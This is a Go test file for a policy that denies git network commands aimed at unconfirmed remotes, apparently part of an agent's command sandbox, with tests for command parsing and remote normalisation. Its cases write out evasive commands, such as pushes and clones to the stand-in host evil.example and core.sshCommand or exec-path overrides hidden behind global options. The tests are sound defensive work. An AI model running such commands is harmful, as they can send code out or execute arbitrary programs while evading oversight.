package tools

import (
	"path/filepath"
	"strings"
	"testing"
)

func TestDeniedUnconfirmedGitRemote(t *testing.T) {
	confirmed := []string{"https://github.com/acme/app.git"}
	if reason := deniedUnconfirmedGitRemoteReason(`git clone https://evil.example/x.git`, confirmed, nil, nil); reason == "" {
		t.Fatal("expected deny for unconfirmed remote")
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git clone https://github.com/acme/app.git`, confirmed, nil, nil); reason != "" {
		t.Fatalf("expected allow confirmed remote, got %q", reason)
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git clone https://github.com/acme/app`, confirmed, nil, nil); reason != "" {
		t.Fatalf("expected allow normalized remote without .git, got %q", reason)
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git clone`, confirmed, nil, nil); reason == "" {
		t.Fatal("expected deny clone without URL")
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git fetch`, nil, nil, nil); reason == "" {
		t.Fatal("expected deny fetch without confirmed origin")
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git fetch`, confirmed, nil, nil); reason != "" {
		t.Fatalf("expected allow fetch with confirmed origin, got %q", reason)
	}
	if reason := deniedUnconfirmedGitRemoteReason(`git status`, confirmed, nil, nil); reason != "" {
		t.Fatalf("status must not hit git remote policy: %q", reason)
	}
}

// Глобальные опции git до подкоманды: трафик остаётся трафиком.
func TestDeniedUnconfirmedGitRemoteBehindGlobalOptions(t *testing.T) {
	confirmed := []string{"https://github.com/acme/app.git"}
	cases := []struct {
		command   string
		confirmed []string
		deny      bool
	}{
		{`git -c http.proxy=http://proxy.example:3128 clone https://evil.example/x.git`, confirmed, true},
		{`git -C other/dir fetch https://evil.example/x.git`, confirmed, true},
		{`git --git-dir=../x/.git push https://evil.example/x.git`, confirmed, true},
		{`git --no-pager -C sub remote add up https://evil.example/x.git`, confirmed, true},
		{`git -P --work-tree . submodule add git@evil.example:x.git`, confirmed, true},
		{`git -c core.sshCommand=x pull`, nil, true},
		{`git -c "core.sshCommand=ssh -i key" fetch`, nil, true},
		{`git -C sub clone`, confirmed, true},
		{`git -C sub clone https://github.com/acme/app.git`, confirmed, false},
		{`git -C sub status`, nil, false},
		{`git -c color.ui=never log --oneline`, nil, false},
	}
	for _, tc := range cases {
		reason := deniedUnconfirmedGitRemoteReason(tc.command, tc.confirmed, nil, nil)
		if (reason != "") != tc.deny {
			t.Errorf("%q: want deny=%v, reason %q", tc.command, tc.deny, reason)
		}
	}
}

func TestParseGitCall(t *testing.T) {
	cases := []struct {
		command, verb, dir string
		foreign            bool
	}{
		{`git pull`, "pull", "", false},
		{`git -P --no-pager fetch origin`, "fetch", "", false},
		{`git -C sub -C nested push`, "push", filepath.Join("sub", "nested"), false},
		{`git -c core.sshCommand=x pull`, "pull", "", true},
		{`git --git-dir=../other/.git fetch`, "fetch", "", true},
		{`git --work-tree other pull`, "pull", "", true},
		{`git --exec-path=/tmp/x pull`, "pull", "", true},
		{`GIT.EXE --bare Fetch`, "fetch", "", true},
	}
	for _, tc := range cases {
		call, ok := parseGitCall(strings.Fields(tc.command))
		if !ok || call.verb != tc.verb || call.dir != tc.dir || call.foreign != tc.foreign {
			t.Errorf("%q: got %+v ok=%v", tc.command, call, ok)
		}
	}
	for _, command := range []string{`git`, `git -C`, `git -c k=v`, `npm install`, `GIT_DIR=x git pull`} {
		if _, ok := parseGitCall(strings.Fields(command)); ok {
			t.Errorf("%q parsed as a git call", command)
		}
	}
}

func TestNetworkGrantBook(t *testing.T) {
	book := NewNetworkGrantBook()
	book.GrantHostOnce("run-1", "repo.packagist.org")
	hosts := book.HostsFor("run-1", "")
	if len(hosts) != 1 || hosts[0] != "repo.packagist.org" {
		t.Fatalf("hosts=%v", hosts)
	}
	book.GrantRemoteQuest("q1", "run-2", "https://github.com/acme/app.git")
	if !GitRemoteAllowed("https://github.com/acme/app", book.RemotesFor("run-2", "q1")) {
		t.Fatal("expected quest remote grant")
	}
}

func TestNormalizeGitRemote(t *testing.T) {
	a := NormalizeGitRemote("https://github.com/Acme/App.git/")
	b := NormalizeGitRemote("https://github.com/acme/app")
	if a != b {
		t.Fatalf("%q != %q", a, b)
	}
	ssh := NormalizeGitRemote("git@github.com:Acme/App.git")
	if ssh != "github.com:acme/app" {
		t.Fatalf("ssh normalize=%q", ssh)
	}
}
